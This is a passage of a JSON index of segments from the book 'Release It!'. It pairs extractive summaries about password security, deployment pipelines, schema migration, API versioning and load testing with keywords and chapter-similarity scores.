passwords, but it is not, by itself, a complete solution.\nSecurity as an Ongoing Process • 233\nThat way the encrypted data (the database passwords) don’t sit in the same storage as the decryption keys!\nIf the application keeps the keys or passwords in memory, then memory dumps will also contain them.\nFor UNIX systems, core files are just memory dumps of the application.\nThis dump file can be analyzed with Microsoft kernel debugging tools; and depending on the configuration of the server, it can contain a copy of the entire physical memory of the machine—passwords and all.\nApplication security affects life and livelihood.\nFull treatment of application security is way beyond the scope of this book.\nThe topics covered in this chapter earned their place by sitting in the inter- section of software architecture, operations, and security.\nIn the next part, we will look at the moment of truth: deployment!\nOne of the SQL scripts didn’t work right, but he “fixed” it by run- ning it under a different user ID.\nThe playbook has a row that says SQL scripts finish at 11:50 p.m. We’re still on the SQL scripts, so logically we’re still at 11:50 p.m. Before dawn, we need our playbook time and solar time to converge in order for this deployment to succeed.\nThe first row in the playbook started yesterday afternoon with a round of status reports from each area: dev, QA, content, merchants, order management, and so on.\nSomewhere on the first page of the playbook we had a go/no-go meeting at 3 p.m. Everyone gave the deployment a go, although QA said that they hadn’t finished testing and might still find a showstopper.\nI don’t know how long I’ll have to wait, but somehow I’m sure the clock will still say 1:17.\nTwo days ago, we started reviewing and updating the playbook.\nPlease say it worked.” An equal number of people are dialed in to the same conference bridge from four locations around the world.\nThat’s my cue: I am Sys Ops. It’s not as cool as saying, “I am Iron Man.” The term “DevOps” won’t exist for another year, and in a different galaxy than this conference room.\nIt updates a symbolic link to point to the new code drop, runs the JSP pre- compiler, and starts the server processes.\nA different script placed the code on the servers hours ago.\nIt’s about $100,000 to run this deployment.\nAt the same time, I had a deep sense of loss: all that time in the deployment army.\nIn the last chapter, we were stuck in a living nightmare, one of many endless deployments that waste countless hours and dollars.\nGiven the diversity of virtualization and deployment options we have now, words like server, service, and host have gotten muddy.\nA service is always made up of redundant copies of software running on multiple machines.\nWe have more ways to run software in production than ever.",
      "keywords": [
        "n’t",
        "Passwords",
        "application",
        "deployment",
        "Security",
        "application security",
        "report erratum",
        "password files",
        "files",
        "system",
        "playbook",
        "time",
        "report",
        "database passwords",
        "production"
      ],
      "concepts": [
        "deploy",
        "deployments",
        "security",
        "secure",
        "files",
        "application",
        "applications",
        "different",
        "report",
        "time"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.549,
          "base_score": 0.399,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 19,
          "title": "",
          "score": 0.497,
          "base_score": 0.347,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 31,
          "title": "",
          "score": 0.482,
          "base_score": 0.332,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 32,
          "title": "",
          "score": 0.477,
          "base_score": 0.327,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 20,
          "title": "",
          "score": 0.469,
          "base_score": 0.319,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "passwords",
          "security",
          "files",
          "playbook",
          "application"
        ],
        "semantic": [],
        "merged": [
          "passwords",
          "security",
          "files",
          "playbook",
          "application"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.207363743100825,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246752+00:00"
      }
    },
    {
      "chapter_number": 31,
      "title": "Segment 31 (pages 248-255)",
      "start_page": 248,
      "end_page": 255,
      "summary": "Design for Deployment • 242\nThat means we shouldn’t plan for one or a few deployments to production, but many upon many.\nOnce upon a time, we wrote our software, zipped it up, and threw it over the wall to operations so they could deploy it.\nReleases should be like what Agent K says in Men in Black: “There’s always an Arquillian Battle Cruiser, or Corillian Death Ray, or intergalactic plague, [or a major release to deploy], and the only way users get on with their happy lives is that they do not know about it!”\nWe can pull it off by designing our applications to account for the act of deployment and the time while the release takes place.\nAutomated Deployments\nOur goal in this chapter is to learn how we need to design our applications so that they’re easy to deploy.\nThis overview won’t be enough for you to pick up Chef and start writing deployment recipes, but it will put Chef and tools like it into context so we know what to do with our ingredients.\nAutomated Deployments • 243\n(Some teams like to build every commit to master; others require a particular tag to trigger a build.) In some ways, the build pipeline is an overgrown continuous integration (CI) server.\nWhere CI would stop after publishing a test report and an archive, the build pipeline goes on to run a series of steps that culminate in a production deployment.\nThis includes steps to deploy code into a trial environment (either real or virtual, maybe a brand-new virtual environment), run migration scripts, and perform integration tests.\ndeploy\nDesign for Deployment • 244\nAt the tail end of the build pipeline, we see the build server interacting with one of the configuration management tools that we first saw in Chapter 8, Processes on Machines, on page 155.\nInstead of describing the specific actions to take, as a shell script would, these files describe a desired end state for the machine or service.\nThe tool’s job is to figure out what actions are needed to make the machine match that end state.\nWith manual assignment, the operator tells the tool what each host or virtual machine must do.\nInstead, the operator supplies a configuration that says, “Service X should be running with Y replicas across these locations.” This style goes hand-in-hand with a platform-as-a-service infrastructure, as shown in the figure on page 245.\nBecause the services can be running on any number of different machines with different IP addresses, the platform must also configure the network for load balancing and traffic routing.\nThis “convergence” approach says the deployment tool must examine the current state of the machine and make a plan to match the desired state you declared.\nUnder the immutable infrastructure approach that we first encountered in Immutable and Disposable Infrastructure, on page 158, the unit of packaging is a virtual machine or container image.\nDesign for Deployment • 246\nSuppose a machine has been around a while, a survivor of many deployments.\nIf not, at least testing and debugging the recipes is straightforward because you only have to account for one initial state rather than the stucco- like appearance of a long-lived machine.\nWhen changes are needed, you update the automation scripts and build a new machine.\nConvergence is more common in physical deployments and on long-lived vir- tual machines and manual mapping.\nContinuous Deployment\nBetween the time a developer commits code to the repository and the time it runs in production, code is a pure liability.\nAs the time from check-in to production increases, more changes accumulate in the deployment.\nContinuous Deployment • 247\ncontinuously.” For deployments, it means run the full build pipeline on every commit.\nOthers have a “pause” stage, where some human must provide positive affirmation that “yes, this build is good.” (Worded another way, it says, “Yes, you may fire me if this fails.”) Either approach is valid, and the one you choose depends greatly on your organization’s context: if the cost of moving slower exceeds the cost of an error in deployment, then you’ll lean toward automatic deployment to production.\nNow that we have a better understanding of what a build pipeline covers, let’s look at the phases of a deployment.\nDesign for Deployment • 248\nPhases of Deployment\nA deployment in a PHP application can be as simple as copying some files onto a production host.\nThese applications will take a long time to copy onto the target machine and then a large runtime process to restart.\nAt the extreme end of the spectrum, we have applications that are deployed as whole virtual machine images.\nWe can relate that grain size to the time needed to update a single machine.\nWe must account for this when rolling a deployment out to many machines.\nIt’s no good to plan a rolling deployment over a 30-minute window only to discover that every machine needs 60 minutes to restart!\nThe microscopic time scale applies to a single instance (host, virtual machine, or container).\nPhases of Deployment • 249\nDeployment\nFor immutable infrastructure, this is the time needed to deploy a new image.\nThe larger your scale, the more likely you’ll just want the time limit to make the whole process more predictable.\nOn the other hand, if your deployment requires you to manually copy archives or edit configuration files, this can take a while.\nFinally, once you start the new release on a particular machine, how long is it before that instance is ready to receive load?\nSend load to a machine that isn’t open for business yet, and you’ll either see server errors or very long response times for those requests unlucky enough to be the first ones through the door.",
      "keywords": [
        "Deployment",
        "build pipeline",
        "machine",
        "build",
        "time",
        "virtual machine",
        "state",
        "n’t",
        "pipeline",
        "tool",
        "Continuous Deployment",
        "files",
        "report erratum",
        "host",
        "production"
      ],
      "concepts": [
        "deployment",
        "deployments",
        "machines",
        "likely",
        "time",
        "production",
        "products",
        "applications",
        "application",
        "configurations"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 37,
          "title": "",
          "score": 0.786,
          "base_score": 0.636,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 32,
          "title": "",
          "score": 0.711,
          "base_score": 0.561,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.691,
          "base_score": 0.541,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 1,
          "title": "",
          "score": 0.688,
          "base_score": 0.538,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.608,
          "base_score": 0.458,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "deployment",
          "machine",
          "pipeline",
          "build",
          "build pipeline"
        ],
        "semantic": [],
        "merged": [
          "deployment",
          "machine",
          "pipeline",
          "build",
          "build pipeline"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2854693326360037,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246791+00:00"
      }
    },
    {
      "chapter_number": 32,
      "title": "Segment 32 (pages 256-265)",
      "start_page": 256,
      "end_page": 265,
      "summary": "Preparation involves all the things you can do without disturbing the current version of the application.\nDuring this time the old version is still running everywhere, but it’s safe to push out new content and assets (as long as they have new paths or URLs).\nThat way, the application can smooth over the things that normally cause us to take downtime for deploy- ments: schema changes and protocol versions.\n• Add new stored procedures.\n• Copy existing data into new tables or columns.\nIn deployments, a shim is a bit of code that helps join the old and new versions of the application.\nAs shown in the figure that follows, in the preparation phase, you add the new table.\nOnce the rollout begins, some instances will be reading and writing the new table.\nThis means it’s possible for an instance to write data into the old table just before it’s shut down.\nWhatever you copied into the new table during preparation won’t include that new entity, so it gets lost.\nShims help solve this by bridging between the old and new structures.\nFor instance, an INSERT trigger on the old table can extract the proper fields and also insert them into the new table.\nSimilarly, an UPDATE trigger on the new table can issue an update to the old table as well.\nJust be careful not to create an infinite loop, where inserting into the old table triggers an insert into the new table, which triggers an insert into the old table, and so on.\nWill all the old documents work on the new version of your application?\nChances are your application has evolved over time, and old versions of those documents might not even be readable now.\nHarder still, your database may have a patchwork of documents, all created using different application versions, with some that have been loaded, updated, and stored at different points in time.\nFirst, write your application so it can read any version ever created.\nWith each new document version, add a new stage to the tail end of a “translation pipeline” like the one shown in the figure on page 253.\nIt needs to be brought up-to-date, which is why the version 2 reader is configured to inject the document into the pipeline via the “version 2 to version 3 translator.” Each translator feeds into the next until the document is completely current.\nThe second read will detect the current version and need zero translations.\nAll the version permutations must be covered by tests, which means keeping old documents around as seed data for tests.\nThe second approach is to write a migration routine that you run across your entire database during deployment.\nInstead, the application must be able to read the new document version and the old version.\n1. An old instance reads an old document.\n2. A new instance reads an old document.\n3. A new instance reads a new document.\n4. An old instance reads a new document.\nFor this reason, it would be best to roll out the application version before running the data migration.\nRather, we add some conditional code in the new version that migrates docu- ments as they are touched, as shown in the figure on page 255.\nThis adds a bit of latency to each request, so it basically amortizes the batched migration time across many requests.\n(After all, the deployment finished days or weeks ago.) Once the batch migration is done, you can even push a new deployment that removes the conditional check for the old version.\nIt allows rapid rollout of the new application version, without downtime for data migration.\nIt takes advantage of our ability to deploy code without disruption so that we can remove the migration test once it’s no longer needed.\nIn today’s applications, front-end asset versions are very tightly coupled to back-end application changes.\nBut when the time comes to deploy an application change, we actually do need the browser to fetch a new version of the script.\nSome cache busting libraries work by adding a query string to the URL, just enough to show a new version.\nThat allows me to have both the old and new versions sitting in different directories.\nThen you might encounter this issue: The browser gets the main page from an updated instance, but gets load-balanced onto an old instance when it asks for a new asset.\nThe old instance hasn’t been updated yet, so it lacks the new assets.\nAnyone on the new app gets served the new assets.\n2. Deploy all the assets to every host before you begin activating the new code.\nIt’s time to turn our attention to the actual rollout of new code.\nThe time has come to roll the new code onto the machines.\nInstruct Alpha to stop accepting new requests.\nA good health check page reports the application version, the runtime’s version, the host’s IP address, and the status of connection pools, caches, and circuit breakers.\nWith this kind of health check, a simple status change in the application can inform the load balancer not to send any new work to the machine.\nBoth the old and new versions are running at the same time.\nTo roll code out here, we don’t change the old machines.\nInstead we spin up new machines on the new version of the code.\nAs the new machines come up and get healthy, they will start taking load.\nThis means that you need session stickiness, or else a single caller could bounce back and forth from the old version on differ- ent requests.\nStarting a new cluster is more like the next figure.\nHere the new machines can be checked for health and well-being before switching the IP address over to the new pool.\nWith very frequent deployments, you are better off starting new machines in the existing cluster.\nNo matter how you roll the code out, it’s true under all these models that in- memory session data on the machines will be lost.\nEvery machine should be on the new code now.\nDon’t swing into cleanup mode until you’re sure the new changes are good.\nWay back in the preparation phase (probably ten minutes ago in real time, or eighteen hours by the playbook from last chapter), we applied the database expansions and added shims.\nOnce every instance is on the new code, those triggers are no longer necessary, so you can just delete them.\nDo put the deletion into a new migration, though.",
      "keywords": [
        "version",
        "application",
        "Deployment",
        "Translator Doc",
        "time",
        "document",
        "n’t",
        "Doc",
        "documents",
        "translator",
        "data",
        "application version",
        "Add",
        "Database",
        "migration"
      ],
      "concepts": [
        "version",
        "versions",
        "migrations",
        "migration",
        "migrates",
        "documents",
        "document",
        "deployment",
        "deployments",
        "time"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 33,
          "title": "",
          "score": 0.72,
          "base_score": 0.57,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 31,
          "title": "",
          "score": 0.711,
          "base_score": 0.561,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 37,
          "title": "",
          "score": 0.662,
          "base_score": 0.512,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.624,
          "base_score": 0.474,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.56,
          "base_score": 0.41,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "new",
          "version",
          "old",
          "table",
          "migration"
        ],
        "semantic": [],
        "merged": [
          "new",
          "version",
          "old",
          "table",
          "migration"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.28476786316392294,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246826+00:00"
      }
    },
    {
      "chapter_number": 33,
      "title": "Segment 33 (pages 266-273)",
      "start_page": 266,
      "end_page": 273,
      "summary": "Design for Deployment • 260\nIt’s also time now to apply another round of schema changes.\nIt might be easy for you to split up your schema changes this way.\nA migrations framework keeps every individual change around as a version- controlled asset in the codebase.\nThe framework can automatically apply any change sets that are in the codebase but not in the schema.\nIn contrast, the old style of schema change relied on a modeling tool—or sometimes a DBA acting like a modeling tool—to create the whole schema at once.\nNew revisions in the tool would create a single SQL file to apply all the changes at once.\nWhether you write migrations by hand or generate them from a tool, the time- ordered sequence of all schema changes is helpful to keep around.\nIt provides a common way to test those changes in every environment.\nDeploy Like the Pros • 261\nDesigning for deployment gives you the ability to make large changes in small steps.\nYour build pipeline should be able to apply all the accumulated wisdom of your architects, developers, designers, testers, and DBAs. That goes way beyond running tests during the build.\nIf you said, “Because the DBA didn’t check the schema changes,” then you’ve taken a step on that gloomy path.\nIf you start from the premise that your build pipeline should be able to catch all mechanical errors like that, then it’s obvious that you should start speci- fying your schema changes in something other than SQL DDL.\nTherefore, it’s worth designing the software to be deployed easily.\nDesign for Deployment • 262\nSmaller, easier deployments mean you can make big changes over a series of small steps.\nThat means we also have the ability to change the way our software talks with the rest of the world easily and repeatedly.\nHowever, as we make changes to add features, we need to be careful not to break consum- ing applications.\nThey shouldn’t have to make a new release at the same time as yours just so you can change your API.\nThat means most new versions of a service should be compatible.\nHandling Versions • 264\n“Be conservative in what you do, be liberal in what you accept from others.”1 It has mostly worked out for the Internet as a whole (subject to a lot of caveats from Chapter 11, Security, on page 215,) so let’s see if we can apply this prin- ciple to protocol versions in our applications.\nIn order to make compatible API changes, we need to consider what makes for an incompatible change.\nHow many distinguish between “Transfer-Encoding” and “Content-Encoding?” When we say our service accepts HTTP or HTTPS, what we usually mean is that it accepts a subset of HTTP, with limitations on the accepted content types and verbs, and responds with a restricted set of status codes and cache control headers.\nHelp Others Handle Your Versions • 265\nWith this view of communication as a stack of layered agreements, it’s easy to see what makes a breaking change: any unilateral break from a prior agreement.\nWe should be able to make a list of changes that would break agreements:\nRejecting a network protocol that previously worked • Rejecting request framing or content encoding that previously worked • Rejecting request syntax that previously worked • Rejecting request routing (whether URL or queue) that previously worked • Adding required fields to the request • Forbidding optional information in the request that was allowed before • Removing information from the response that was previously guaranteed • Requiring an increased level of authorization\nAnd it’s okay to return more than before the change.\nBad news: the service now rejects requests that it previously accepted.\nHandling Versions • 266\nIt’s common to find gaps like these between the documented protocol and what the software actually expects.\nOnce the service is public, a new version cannot reject requests that would’ve been accepted before.\nThat allows other services to consume yours by coding to the specification.\nIt also allows you to apply generated tests that will push the boundaries of the specification.\nI also recommend running randomized, generative tests against services you consume.\nHelp Others Handle Your Versions • 267\nAs the consuming group, my team wrote FIT tests that illustrated every case in the specification.2 We thought of these as contract tests.\nI don’t think it would have worked nearly as well if we’d had the implementing team write the tests.\nAs the figure illustrates, such tests are owned by the calling service, so they act as an early warning system if the provider changes.",
      "keywords": [
        "n’t",
        "schema",
        "versions",
        "API accepts HTTP",
        "report erratum",
        "API",
        "Drop",
        "service",
        "apply",
        "software",
        "previously",
        "Request",
        "version",
        "time",
        "service accepts HTTP"
      ],
      "concepts": [
        "changes",
        "deployment",
        "deployments",
        "request",
        "requests",
        "versions",
        "specification",
        "specifications",
        "consumers",
        "consume"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 32,
          "title": "",
          "score": 0.72,
          "base_score": 0.57,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 31,
          "title": "",
          "score": 0.576,
          "base_score": 0.426,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.546,
          "base_score": 0.396,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.513,
          "base_score": 0.363,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 37,
          "title": "",
          "score": 0.507,
          "base_score": 0.357,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "previously",
          "schema",
          "changes",
          "schema changes",
          "versions"
        ],
        "semantic": [],
        "merged": [
          "previously",
          "schema",
          "changes",
          "schema changes",
          "versions"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.20918462443409938,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246877+00:00"
      }
    },
    {
      "chapter_number": 34,
      "title": "Segment 34 (pages 274-281)",
      "start_page": 274,
      "end_page": 281,
      "summary": "Handling Versions • 268\nThe very first prerequisite is to actually put a version number in your request and reply message formats.\nThis is the version number of the format itself, not of your application.\nAny individual consumer is likely to support only one version at a time, so this is not for the consumer to automatically bridge versions.\nLet’s use the following routes from a peer-to-peer lending service (the service that collects a loan application for credit analysis) as a running example.\nIt needs to know some things about the loan and the requester:\nIt turns out that a successful service needs to be changed more often than a useless one.\nIt also turns out that one legal entity can be both a borrower and a lender at different times, but that each one can only operate in certain countries (the ones in which they are incorporated.) So we have breaking changes to deal with in both the data returned with the “/request” routes and a need to replace the “/borrower” routes with something more general.\nHelp Others Handle Your Versions • 269\n1. Add a version discriminator to the URL, either as a prefix or a query parameter.\nYou can also query your logs to see how many consumers are using each version over time.\n2. Use the “Accept” header on GET requests to indicate the desired version.\nFor example, we can define a media type “application/vnd.lendzit.loan- request.v1” and a new media type “application/vnd.lendzit.loan-request.v2” for our versions.\nIf a client fails to specify a desired version, it gets the default (the first nondeprecated version.) Advantage: Clients can upgrade without changing routes because any URLs stored in databases will con- tinue to work.\n3. Use an application-specific custom header to indicate the desired version.\nWe can define a header like “api-version.” Advantages: Complete flexibility, and it’s orthogonal to the media type and URL.\n4. For PUT and POST only, add a field in the request body to indicate the intended version.\nHandling Versions • 270\nframework change, where I’d really like to have the new version running on a separate cluster.\nNo matter which approach you choose, as the provider, you must support both the old and the new versions for some period of time.\nWhen you roll out the new version (with a zero-downtime deployment, of course), both versions should operate side by side.\nBe sure to run tests that mix calls to the old API version and the new API version on the same entities.\nYou’ll often find that entities created with the new version cause internal server errors when accessed via the old API.\nIf you do put a version in the URLs, be sure to bump all the routes at the same time.\nEven if just one route has changed, don’t force your consumers to keep track of which version numbers go with which parts of your API.\nOnce your service receives a request, it has to process it according to either the old or the new API.\nI’ll assume that you don’t want to just make a complete copy of all the v1 code to handle v2 requests.\nMethods that handle the new API go directly to the most current version of the business logic.\nMethods that handle the old API get updated so they convert old objects to the current ones on requests and convert new objects to old ones on responses.\nHandle Others’ Versions\nRight now, we’re just going to talk about how to design for version changes.\nHandle Others’ Versions • 271\nLet’s look at the loan application service again.\nAs a reminder, from Table 1, Example Routes, on page 268, we have some routes to collect a loan application and data about the borrower.\nNow suppose a consumer sends a POST to the /applications route.\nThe requester data gets a new numeric field for “creditScore.” The loan data gets a new field for “collateralCategory” and a new allowed value for the “riskAd- justments” list.\nYou put some new fields in your request specification, but that doesn’t mean you can assume anyone will obey them.\nRemember that your suppliers can deploy a new version at any time, too.\nHandling Versions • 272\nThese problems are another reason I like the contract testing approach from Help Others Handle Your Versions, on page 263.\nThat verifies how the end-to-end loop works right now, but it doesn’t verify that the caller correctly conforms to the contract, nor that the caller can handle any response the supplier is allowed to send.\nConsequently, some new release in the provider can change the response in an allowed but unexpected way, and the consumer will break.\nIn this chapter, we’ve seen how to handle our versions to aid others and how to defend ourselves against version changes in our consumers and providers.\nI had joined this huge team (more than three hundred in total) nine months earlier to help build a complete replacement for a retailer’s online store, content management, customer service, and order-processing systems.",
      "keywords": [
        "version",
        "Versions",
        "request",
        "Handle Others’ Versions",
        "service",
        "API version",
        "API",
        "Handle",
        "routes",
        "application",
        "version number",
        "version changes",
        "Handling Versions",
        "borrower",
        "POST"
      ],
      "concepts": [
        "versions",
        "version",
        "request",
        "requester",
        "service",
        "routes",
        "routing",
        "application",
        "applications",
        "likely"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 40,
          "title": "",
          "score": 0.494,
          "base_score": 0.344,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 38,
          "title": "",
          "score": 0.465,
          "base_score": 0.315,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 39,
          "title": "",
          "score": 0.454,
          "base_score": 0.304,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 42,
          "title": "",
          "score": 0.307,
          "base_score": 0.307,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "version",
          "versions",
          "loan",
          "routes",
          "handle"
        ],
        "semantic": [],
        "merged": [
          "version",
          "versions",
          "loan",
          "routes",
          "handle"
        ]
      },
      "topic_id": 5,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.18366647550912066,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246910+00:00"
      }
    },
    {
      "chapter_number": 35,
      "title": "Segment 35 (pages 282-289)",
      "start_page": 282,
      "end_page": 289,
      "summary": "The new site was live and in production.\n(The browser in the conference room was configured to bypass the CDN and hit the site directly, going straight to what the CDN called the “origin servers.” Marketing people aren’t the only ones who know how to engage in smoke and mirrors.) In fact, we could immediately see the new traffic coming into the site.\nBy 9:05 a.m., we already had 10,000 sessions active on the servers.\nAt 9:10 a.m., more than 50,000 sessions were active on the site.\nBy 9:30 a.m., 250,000 sessions were active on the site.\nEarly in my time on the project, I realized that the development teams were building everything to pass testing, not to run in production.\nIn many ways, the testing environment also reflected outdated ideas about the system architecture that everyone “just knew” would be different in production.\nThe barrier to change in the test environment was high enough, however, that most of the development team chose to ignore the discrepancies rather than lose one or two weeks of their daily build-deploy-test cycles.\nI decided to compile a list of properties that looked as if they might need to change for production: hostnames, port numbers, URLs, database connection parameters, log file locations, and so on.\nOnce I had a map of which properties needed to change in production, it was time to start defining the production deployment structure.\nJust changing a database password looked as if it would necessitate editing more than a hundred files across twenty servers, and that problem would only get worse as the site grew.\nLoad Testing • 281\nIn setting up the production environment, I had inadvertently volunteered to assist with the load test.\nLoad Testing\nWith a new, untried system, the client knew that load testing would be critical to a successful launch.\nBefore the site could launch, marketing had declared that it must support 25,000 concurrent users.\nSession Active\nIt keeps the session alive for some number of minutes after the user last clicked.\nThat means the session is absolutely guaranteed to last longer than the user.\nCounting sessions overestimates the number of users, as demon- strated in the next figure.\nThe number of active sessions is one of the most important measurements about a web system, but don’t confuse it with counting users.\nYou define a test plan, create some scripts (or let your vendor create the scripts), configure the load generators and test dispatcher, and fire off a test run during the small hours of the night.\nYou analyze the results, make some code or configuration changes, and schedule another test run.\nSo, we got a bunch of people on a conference call: the test manager, an engineer from the load test service, an architect from the development team, a DBA to watch database usage, and me (monitoring and analyzing applications and servers).\nTraffic analysis gives you nothing but variables: browsing patterns, number of pages per session, conversion rates,\nLoad Testing • 283\nA user who checks out often accesses twelve pages during the session, whereas a user who just scans the site and goes away typically hits no more than seven pages.\nOn the first test run, the test had ramped up to only 1,200 concurrent users when the site got completely locked up.\nAfter three months of this testing effort and more than sixty new application builds, we had achieved a tenfold increase in site capacity.\nThe site could handle 12,000 active sessions, which we estimated to represent about 10,000 customers at a time (subject to all the caveats about counting customers).\nFurthermore, when stressed over the 12,000 sessions, the site didn’t crash anymore, although it did get a little “flaky.” During these three months, marketing had also reassessed their target for launch.\nInstead of 25,000 concurrent users, they thought 12,000 sessions would suffice for launch during the slow part of the year.\nSo after all that load testing, what happened on the day of the launch?\nPerhaps the customers had built up anticipation for the new site.\nIt was the number of sessions that killed the site.\nWith session replication enabled (it was), each session gets serialized and transmitted to a session backup server after each page request.\nAll of our load testing was done with scripts that mimicked real users with real browsers.\nUnfortunately, on the day of the switch, they drove customers to old-style URLs. The web servers were configured to send all requests for .html to the application servers (because of the application servers’ ability to track and report on sessions).\nThat meant that each customer coming from a search engine was guaranteed to create a session on the app servers, just to serve up a 404 page.\nThe search engines noticed a change on the site, so they started refetching all the cached pages they had.\nWe found one search engine that was creating up to ten sessions per second.\nFinally, there were the sources that we just called “random weird stuff.” (We didn’t really use the word “stuff.”) For example, one computer on a Navy base would show up as a regular browsing session, and then about fifteen minutes after the last legitimate page request, we’d see the last URL get requested again and again.\nMore sessions.",
      "keywords": [
        "site",
        "sessions",
        "Load Testing",
        "session",
        "production",
        "Load",
        "users",
        "active sessions",
        "n’t",
        "system",
        "report erratum",
        "servers",
        "report",
        "Customers",
        "Conway"
      ],
      "concepts": [
        "sessions",
        "session",
        "site",
        "servers",
        "pages",
        "report",
        "applications",
        "application",
        "integration",
        "integrations"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 36,
          "title": "",
          "score": 0.68,
          "base_score": 0.53,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 9,
          "title": "",
          "score": 0.653,
          "base_score": 0.503,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.515,
          "base_score": 0.515,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 2,
          "title": "",
          "score": 0.443,
          "base_score": 0.443,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.421,
          "base_score": 0.421,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "site",
          "sessions",
          "000",
          "session",
          "load testing"
        ],
        "semantic": [],
        "merged": [
          "site",
          "sessions",
          "000",
          "session",
          "load testing"
        ]
      },
      "topic_id": 6,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.32946036143350677,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246952+00:00"
      }
    },
    {
      "chapter_number": 36,
      "title": "Segment 36 (pages 290-298)",
      "start_page": 290,
      "end_page": 298,
